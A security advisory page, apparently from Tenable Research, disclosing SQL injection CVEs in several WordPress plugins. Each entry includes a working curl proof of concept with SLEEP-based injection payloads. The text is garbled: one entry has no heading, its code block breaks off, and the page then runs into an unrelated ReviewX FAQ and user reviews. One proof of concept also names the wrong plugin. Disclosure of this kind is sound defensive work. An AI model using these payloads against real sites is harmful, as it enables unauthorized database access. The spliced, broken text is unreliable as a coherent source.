# SQL Injection in Multiple WordPress Plugins

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Joshua Martinelle of Tenable Research discovered multiple SQL Injection vulnerabilities across a number of WordPress plugins. This advisory will track each vulnerability as information and fixes become available.

---

**Paid Memberships Pro : CVE-2023-23488 - Unauthenticated SQL Injection**

**Reference:** https://wordpress.org/plugins/paid-memberships-pro

**Affected Versions:** < 2.9.8

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 'code' parameter in the /pmpro/v1/order REST route before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

```

curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
```

For example, running this twice with the "time" command will show the difference in response times:

```

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(1)))a)--%20-"
{}
real    0m3.068s
user    0m0.006s
sys    0m0.009s

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
{}
real    0m6.095s
user    0m0.006s
sys    0m0.009s
```

**Easy Digital Downloads: CVE-2023-23489 - Unauthenticated SQL Injection

Reference:** https://wordpress.org/plugins/easy-digital-downloads/

**Affected Versions:**3.1.0.2 & 3.1.0.3

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 's' parameter in the 'edd\_download\_search' action before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

The vulnerable part of the code corresponds to the 'edd\_ajax\_download\_search()' function of the './includes/ajax-functions.php' file.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

*Note:* The same SQL injection/unique request will not work twice in a row right away, as the 'edd\_ajax\_download\_search()' function stores the most recent search for 30 seconds (so to run the same payload again, you will have to modify the payload slightly or wait 30 seconds).

```

curl "http://TARGET_HOST/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-"

```

**Survey Maker: CVE-2023-23490 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/survey-maker

**Affected Versions:** < 3.1.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the ‘surveys\_ids’ parameter in the 'ays\_surveys\_export\_json' action before using it in a SQL statement, leading to an authenticated SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=ays_surveys_export_json&surveys_ids[0]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-"

```

---

**ReviewX: CVE-2023-26325 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/reviewx/

**Affected Versions:** <= 1.6.6

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the 'filterValue' or 'selectedColumns' parameters in the rx\_export\_review action before using them in a SQL statement, leading to a SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=rx_export_review&filterValue[0]=&filterValue[1]=&filterValue[2]=&filterValue[3]=&filterValue[4]=all&filterValue[5]=&filterValue[6]=aaaa&filterValue[7]=id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)&filterValue[8]=desc&selectedColumns[0]=id"
```

**Waiting: One-click Countdowns: CVE-2023-28659 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/waiting/

**Affected Versions:** <= 0.6.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The **pbc\_down[meta][id]** parameter of the **pbc\_save\_downs** action is vulnerable to SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=pbc_save_downs&pbc_down[meta][id]=1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--"
```

**Events Made Easy: CVE-2023-28660 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/events-made-easy/

**Affected Versions:** <= 2.3.14

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**search\_name**' parameter in the **eme\_recurrences\_list** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php?action=eme_recurrences_list&search_name=1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}" --header "$WP_COOKIE"
```

Reference:**https://wordpress.org/plugins/wp-popup-banners/

**Affected Versions:** <= 1.2.5

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**value**' parameter in the **get\_popup\_data** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

## FAQ

### Does it work with any WordPress theme?

Yes, it will work with any standard WordPress theme.

### How does the multi-criteria review feature work?

Multi-criteria reviews allow customers to rate products on different aspects such as quality, value for money, and usability. You can customize the criteria to fit your products.

### Can I customize the review reminder emails?

Yes, ReviewX allows you to fully customize the review reminder emails, including the content, timing, and design.

### Is ReviewX compatible with other WooCommerce plugins?

Absolutely! ReviewX is designed to work seamlessly with other popular WooCommerce plugins, ensuring a smooth and integrated experience.

### Why are multi-criteria review important?

Multiple review criteria help to make your product more transparent for customers to get detailed feedback that will help you to improve the product quality.

### What If I uninstall the ReviewX plugin?

If you uninstalled the ReviewX plugin still all of your WooCommerce product reviews data is fully safe. But, we assume that you’re not expecting the multi-criteria based ratting once you uninstalled the ReviewX plugin.

### Can I migrate from my existing review data?

All of your previous reviews with ratting data will be migrated automatically.

But we assume that you’re not expecting the multi-criteria based ratting for those previous reviews as by that time you weren’t using ReviewX

### [Good Idea, Poor Execution, Getting Better (updated 12-19-24)](https://wordpress.org/support/topic/great-plugin-amazing-support-164/)

Edit 12-19-24: Updating to 4 stars as the team is very responsive in their support and they seem like they will be quick to offer bug updates within the software.Edit 12-17-24: I had been using this plugin for about 2 years and was very happy with it. The company did a MAJOR overhaul to their 2.0 cloud version. The result has been a DISASTER. First, im not sure how it got upgraded (i dont have auto updates on, nor did i personally update this. We do however have others in the organization with access to our site, so ill take responsibility for the upgrade). Saying that, i would have hoped the transition would have been more seamless. It was far from this.Having worked in software field managing software products for over 15 years, i know how new products, releases etc. should be rolled out. This experience with ReviewX has been pretty bad. The product seems to have been rushed to market, missing key functionality that was included in the previous version (almost seems to be a downgrade) and is bug ridden with lots of formatting issues. 2nd, the transition from version 1 to 2 was not executed well (lots of issues with license key, old reviews being synch’d correctly etc..) – and the support team doesnt seem to really understand fixes/functionality.Its been a frustrating experience. I would say the ReviewX team is trying to help, but its been a bit painful. At no point should a software upgrade be a software downgrade (as is my opinion with the version 2.0). Im hoping reviewX can get these issues resolved in a timely manner and get bugs fixed/previously functionality restored.Last comment, if just starting out (not upgrading from previous version), and the licensing issues get resolved, i would say the ReviewX plugin is a good, modern review widget that provides better visual/experience vs. the traditional woocommerce review plugin. And in this case, i would suggest the plugin.I will be happy to update my review as new versions of the 2.0 update is released.

I’ve been using this plugin for one of my sites sportshanger.com.cy and it has helped a lot as customers receive a discount coupon when they review a product they have already bought.
Support is also excellent! Recommended

Installed unknownly by a Fiverr guy so we could get reviews to post with most recent first. Turned images and font size HUGE. Had to deactivate. Using Buddyboss platform.

I cannot thank these folks enough, one for a great plugin! Two for fixing something that no-one knew had to fix! Right at the time of deciding to move the entire site to a new theme, they got it done!
The plugin is super easy to use! Has all of the bells and whistles! I love that it auto-sends emails for coupon codes and that customers can upload before and after photos.
